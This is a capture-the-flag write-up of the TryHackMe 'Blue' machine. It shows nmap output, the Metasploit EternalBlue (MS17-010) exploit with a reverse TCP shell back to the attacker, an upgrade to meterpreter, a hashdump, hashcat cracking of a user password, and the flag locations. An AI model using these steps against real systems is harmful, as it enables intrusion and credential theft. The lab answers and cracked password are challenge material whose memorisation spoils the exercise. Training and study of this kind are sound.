# Blue
Armand Alvarez | Friday, 05 November 2021

---

 Since I use tmux, and I use multiple sessions, I set the tmux env variable $IP to the IP address givent to me by THM.
 
 ```bash
 └─$ tmux setenv IP 10.10.91.32
```

---

## Nmap


```
# Nmap 7.91 scan initiated Fri Nov  5 22:39:26 2021 as: nmap -sCV -v -oN initial 10.10.91.32
Increasing send delay for 10.10.91.32 from 0 to 5 due to 255 out of 848 dropped probes since last increase.
Nmap scan report for 10.10.91.32
Host is up (0.11s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2021-11-06T02:40:39+00:00
| ssl-cert: Subject: commonName=Jon-PC
| Issuer: commonName=Jon-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-11-05T02:12:25
| Not valid after:  2022-05-07T02:12:25
| MD5:   860d 0816 ffbb 1bde 790e f320 9a87 3abb
|_SHA-1: b33b 9c4e b514 c812 32b1 324c 397d 10e6 6c9b 3ad8
|_ssl-date: 2021-11-06T02:40:44+00:00; +1s from scanner time.
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
49159/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h00m00s, deviation: 2h14m09s, median: 0s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:fd:9f:77:75:ad (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-11-05T21:40:38-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-11-06T02:40:38
|_  start_date: 2021-11-06T02:12:24

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  5 22:40:43 2021 -- 1 IP address (1 host up) scanned in 77.09 seconds

```

We can see from this that the machine has SMB running - with the OS: Windows 7 Service Pack 1. The SMBv1 server in this OS is vulnerable to Eternal Blue, or CVE-2017-0144 [CVE link](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144).  This vulnerability was published in MS security bulletin **ms17-010** [MS Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)

## Metasploit

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

```

Launch Metasploit on linux with `msfconsole`. You can search for either the ms # (ms17-010) or the CVE # (2017-0144) and find similar results. 
We can see the exploit path is **exploit/windows/smb/ms17_010_eternalblue**

### Options

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                             /wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects
                                             Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wind
                                             ows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target mach
                                             ines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server
                                              2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.240    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

The options show us a few required options. The only one not set is **RHOSTS** - which is the target host (see description.) 

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.10.91.32
rhosts => 10.10.91.32
```

Set the payload to a reversetcp shell

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp

```

Make sure if you are running openvpn (THM usually requires it) you set the LHOST (local host option) to your tun0 ip. You can find this by running `ifconfig`

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.6.77.21
LHOST => 10.6.77.21
```

It took me letting the exploit run a few times but I finally got in. 

### Upgrading from normal shell to meterpreter shell

I am using [this](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646) writeup to convert the shell.

First, background the current (Normal Shell) session. 
```
C:\Windows\system32>^Z
Background session 1? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 

```

Select the shell_to_meterpreter module

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use 0
msf6 post(multi/manage/shell_to_meterpreter) > 

```

Our options show that we must add the SESSION. 

```
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to au
                                       to detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.


```

Set our session to 1 and run.

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information  Connection
  --  ----  ----               -----------  ----------
  1         shell x64/windows               10.6.77.21:4444 -> 10.10.91.32:49233 (10.10.91.32)
  2         shell x64/windows               10.6.77.21:4444 -> 10.10.91.32:49234 (10.10.91.32)

msf6 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1

```

Now that it has created a new meterpreter session, we can open it

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         shell x64/windows                                      10.6.77.21:4444 -> 10.10.91.32:49233 (10.10.91.3
                                                                   2)
  2         shell x64/windows                                      10.6.77.21:4444 -> 10.10.91.32:49234 (10.10.91.3
                                                                   2)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.6.77.21:4433 -> 10.10.91.32:49246 (10.10.91.3
                                                                   2)

msf6 post(multi/manage/shell_to_meterpreter) > session -i 3
[-] Unknown command: session
msf6 post(multi/manage/shell_to_meterpreter) > session -i 3
[-] Unknown command: session
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > 

```

## Meterpreter

After I got the ugpraded shell, I ran the command `shell` to open a dos shell then `whoami` to verify I was indeet NT AUTHORITY\SYSTEM. Then I ran the `ps` command to list all running processes, and `migrate` to a process running at NT AUTHORITY\SYSTEM

### Cracking the password

Dump all the hashes of the users on this machine. You can do this because you are on an elevated shell.

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```

I copied this hash into a file and used hashcat to crack it. This [article](https://pentesthacker.com/2020/12/27/kali-hashcat-and-john-the-ripper-crack-windows-password-hashdump/) shows how to do that.

```
└─$ hashcat -m 1000 --show hash /usr/share/wordlists/rockyou.txt
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22

```

## Finding the Flags

The first flag can be found at the root of the machine.

```
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
40777/rwxrwxrwx   0      dir   2009-07-13 23:18:56 -0400  $Recycle.Bin
40777/rwxrwxrwx   0      dir   2009-07-14 01:08:56 -0400  Documents and Settings
40777/rwxrwxrwx   0      dir   2009-07-13 23:20:08 -0400  PerfLogs
40555/r-xr-xr-x   4096   dir   2009-07-13 23:20:08 -0400  Program Files
40555/r-xr-xr-x   4096   dir   2009-07-13 23:20:08 -0400  Program Files (x86)
40777/rwxrwxrwx   4096   dir   2009-07-13 23:20:08 -0400  ProgramData
40777/rwxrwxrwx   0      dir   2018-12-12 22:13:22 -0500  Recovery
40777/rwxrwxrwx   4096   dir   2018-12-12 18:01:17 -0500  System Volume Information
40555/r-xr-xr-x   4096   dir   2009-07-13 23:20:08 -0400  Users
40777/rwxrwxrwx   16384  dir   2009-07-13 23:20:08 -0400  Windows
100666/rw-rw-rw-  24     fil   2018-12-12 22:47:39 -0500  flag1.txt
0000/---------    0      fif   1969-12-31 19:00:00 -0500  hiberfil.sys
0000/---------    0      fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}meterpreter > 

```

The second flag is in the `C:\Windows\System32\config` location. This is where passwords are stored.

I was having trouble finding the final flag. But I realized on meterpreter you can do `search -f flag*` to search for any files that begin with "flag". This showed me the location of the final flag. It is in Jon's documents. 

---

That's all! Happy hacking :)